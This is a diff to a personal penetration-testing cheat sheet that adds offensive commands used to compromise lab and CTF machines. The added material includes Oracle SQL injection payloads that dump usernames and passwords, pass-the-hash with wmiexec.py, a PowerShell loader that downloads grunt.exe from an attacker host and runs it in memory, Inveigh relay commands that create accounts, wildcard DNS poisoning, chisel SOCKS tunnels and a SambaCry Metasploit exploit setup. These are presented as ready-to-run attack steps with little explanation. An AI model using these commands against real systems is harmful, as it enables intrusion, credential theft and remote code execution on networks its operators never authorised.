@@ -1,7 +1,5 @@
 # EzpzCheatSheet
-This CheatSheet will not have much explanation. It just a commands that has been used pwning all of the machines from various platform and something that I have encounter before.
-
-
+This CheatSheet will not have much explanation. It just a commands that has been used pwning all of the machines from various platform and something that I have encounter before. Also any notes, CTF and others that help me.
 
 # A. Ports
 
@@ -95,7 +93,7 @@ rpcclient -U '' -N 10.10.10.10
 ```bash
 # Nmap
 nmap --script "safe or smb-enum-*" -p 445 10.10.10.10
-nmap --script smb-vuln\* -p 137,139,445 10.10.10.10
+nmap --script smb-vuln* -p 137,139,445 10.10.10.10
 
 # Smbmap
 smbmap -H 10.10.10.10
@@ -147,6 +145,16 @@ nmap -n -sV --script "ldap\* and not brute" 10.10.10.10
 ldapsearch -h 10.10.10.10 -x -b 'DC=bank,DC=local' -s sub
 ldapsearch -LLL -x -H ldap://10.10.10.10 -b '' -s base '(objectclass=\*)'
 ldapsearch -x -h 10.10.10.10 -D 'bank.local\nik' -w 'Password@123!' -b 'CN=Users,DC=bank,DC=local'
+
+```
+
+### 1433 (MSSQL)
+
+```code
+# Commands
+SELECT @@version
+SELECT DB_NAME()
+SELECT name FROM master..sysdatabases;
 
 ```
 
@@ -295,6 +303,19 @@ IF((select MID(user,1,1) from mysql.user limit 0,1)='D' , sleep(5),0)
 ## Extract
 9999 union select 1,group_concat(user,":",password),3,4,5 from mysql.user
 
+[ORACLE]
+## Get Current Database
+union SELECT SYS.DATABASE_NAME,'b',1 FROM v$version--
+
+## Get All Tables
+' union SELECT table_name,'b',1 FROM all_tables--
+
+## Get Columns
+' union SELECT column_name,'b',1 FROM all_tab_columns WHERE table_name = 'TABLE'--
+
+## Extract
+' union SELECT USERNAME,'b',1 FROM TABLE--
+' union SELECT USERNAME||':'||PASSWORD,'',1 FROM TABLE--
 ```
 
 ### Hydra
@@ -417,6 +438,7 @@ https://github.com/jpillora/chisel
 
 ## Client Machine
 ./chisel client 10.66.67.154:8000 R:25:127.0.0.1:25
+./chisel client 10.10.10.10:8001 R:1080:socks
 
 ## Attacker Machine
 ./chisel server -p 8000 --reverse
@@ -600,6 +622,57 @@ powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('h
 Invoke-Mimikatz -DumpCreds
 ```
 
+### Sharphound.ps1
+
+```code
+# Downloads
+https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1
+
+# Commands
+Invoke-Bloodhound -CollectionMethod All -Domain bank.local
+Invoke-Bloodhound -CollectionMethod All 
+
+```
+
+### jq
+
+```code
+# Install
+sudo apt install jq
+
+# Example
+cat 20210606133816_users.json | jq '.users[] | .Properties["name"]'
+
+# References
+https://lzone.de/cheat-sheet/jq
+
+```
+
+### Linux Commands
+
+```code
+# Remove First Character
+echo "xtest" | cut -c2-
+```
+
+### Bloodhound
+
+```code
+# Donwloads/Install
+sudo apt-get install bloodhound
+
+# Commands
+ne04j console
+neo4j
+
+# Notes
+http://localhost:7474/
+neo4j:neo4j
+
+
+```
+
+
 ### Rubeus
 ```bash
 # Download
@@ -621,25 +694,55 @@ https://github.com/GhostPack/Rubeus
 # Commands
 ImpersonateProcess 1776
 ImpersonateProcess <PID>
+PortScan 192.168.20.10 10-2000
+
+# Chisel
+- shell C:\windows\tasks\chisel_windows.exe client 10.10.10.10:8000 R:1080:socks
+	* Edit /etc/proxychains4.conf => socks5  127.0.0.1 1080
 
 # Rubeus
 - Rubeus kerberoast admin hashcat
 - Rubeus klist
 
-
 # Import Powershell
 - PowerShellImport 
 - Choose file
 
-
-# Powerview.ps1
+# Powerview
 - Powershell Get-DomainUser -TrustedToAuth
 
+# PowerMad
+- Powershell Resolve-DNSName NoDNSRecord
+- Powershell New-ADIDNSNode -Node * -Verbose
+- Powershell grant-adidnspermission -node * -principal "Authenticated Users" -Access GenericAll -Verbose
+
+# Invoke-DNSUpdate
+- Powershell Invoke-DNSupdate -DNSType A -DNSName * -DNSData 10.10.10.10 -Verbose
 
 # Inveigh
 - Powershell Invoke-InveighRelay -ConsoleOutput -Y -StatusOutput N -Command "net user commandtest Passw0rd123! /add" -Attack Enumerate,Execute,Session
 - Powershell Invoke-Inveigh -ConsoleOutput Y
+- Powershell Stop-Inveigh
+- Powwershell Invoke-Inveigh -FileOutput Y
 
+# Load Grunt (Load Assembly)
+$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/grunt.exe')
+$assem = [System.Reflection.Assembly]::Load($data)
+[GruntStager.GruntStager]::Main("".Split())
+
+# Impersonate 
+getsystem
+
+```
+
+### Crackmapexec
+
+```code
+# Docker install
+docker pull byt3bl33d3r/crackmapexec
+docker run -it --entrypoint=/bin/sh --name crackmapexec byt3bl33d3r/crackmapexec
+docker start crackmapexec
+docker exec -it crackmapexec sh
 ```
 
 ### Impacket Tools
@@ -653,6 +756,18 @@ GetUserSPNs.py bank.local/nik:'Password@123!' -dc-ip 10.10.10.10 -request -outpu
 
 # secretsdump.py
 secretsdump.py -just-dc bank.local/nik:'Password@123!'@10.10.10.10
+
+# wmiexec.py
+wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:0405e42853c0f2cb0454964601f27bae administrator@10.10.10.10
+wmiexec.py -hashes :0405e42853c0f2cb0454964601f27bae administrator@10.10.10.10
+
+# smbclient.py
+smbclient.py bank.local/nik:'Password@123'@10.10.10.10
+
+# mssqlclient.py
+mssqlclient.py  -windows-auth bank.local/aniq:'Password@123'@10.10.10.10
+
+
 ```
 
 ### Objection
@@ -702,6 +817,52 @@ https://github.com/pwntester/ysoserial.net
 # References
 - https://gist.github.com/lanmaster53/3d868369d0ba5144b215921d4e11b052
 - https://github.com/PortSwigger/python-scripter
+```
+
+### CTI Lexicon
+
+```
+Link : https://github.com/BushidoUK/CTI-Lexicon/blob/main/Lexicon.md
+
+# About
+- Guide to some of the jargon and acronyms liberally used in CTI. You will sometimes find these peppered in reports with no explanation offered or in the Tweets by professionals from Infosec Twitter
+```
+
+### Waifu2x (Image Super-Resolution)
+
+```
+# References
+- https://github.com/nagadomi/waifu2x
+- http://waifu2x.udp.jp/
+```
+
+### Powerview.ps1
+
+```code
+# Get Domain Computers
+Get-DomainComputer
+Get-DomainComputer -properties name
+Get-DomainTrustMapping -Verbose
+Get-DomainTrust
+
+
+# References
+https://gist.github.com/macostag/44591910288d9cc8a1ed6ea35ac4f30f
+https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
+```
+
+### PowerUpSQL.ps1
+
+```code
+# Commands
+Get-SQLInstanceLocal -Verbose
+Get-SQLInstanceDomain -Verbose
+Get-SQLServerInfo -Verbose -Instance query.bank.local
+Invoke-SQLAudit -Verbose -Instance query.bank.local
+Get-SQLQuery -instance query.bank.local -query "select * from master..sysservers"
+
+# References
+https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet
 ```
 
 # C. SUID/CAP/SUDO/GROUP
@@ -1122,6 +1283,31 @@ gcc -pthread dirty.c -o dirty -lcrypt
 
 # < 3.19
 - https://www.exploit-db.com/exploits/37292
+
+# < 5.11
+- https://github.com/briskets/CVE-2021-3493
+```
+
+### SambaCry RCE: CVE-2017–7494
+
+```bash
+# Vulnerable Versions
+- Within versions 3.5.0 and before 4.6.4, 4.5.10 and 4.4.14.
+
+# Downloads
+https://github.com/joxeankoret/CVE-2017-7494
+
+# Commands (Metasploit)
+use linux/samba/is_known_pipename
+set SMB::AlwaysEncrypt false
+set SMB::ProtocolVersion 1
+set rhosts 10.10.10.10
+
+# Commands Manual
+
+
+# References
+- https://bond-o.medium.com/sambacry-rce-cve-2017-7494-41c3dcc0b7ae
 ```
 
 # E. CMS/Web
@@ -1274,6 +1460,18 @@ https://www.sourcecodester.com/php/12306/voting-system-using-php.html
 /var/www/osticket/upload/include/ost_config.php
 ```
 
+### SharePoints
+
+```bash
+# References
+https://hackingprofessional.github.io/HTB/Hacking-a-sharepoint-website/
+https://the-infosec.com/2017/04/18/penetration-testing-sharepoint/
+https://the-infosec.com/2017/04/18/penetration-testing-sharepoint/
+https://www.crummie5.club/the-lone-sharepoint/
+https://www.mdsec.co.uk/2020/03/a-security-review-of-sharepoint-site-pages/
+
+```
+
 # F. Reverse Shell
 
 ### PowerShell
@@ -1287,3 +1485,4 @@ https://www.sourcecodester.com/php/12306/voting-system-using-php.html
 - https://github.com/swisskyrepo/PayloadsAllTheThings
 - https://book.hacktricks.xyz/
 - https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70
+- https://zer1t0.gitlab.io/posts/attacking_ad/
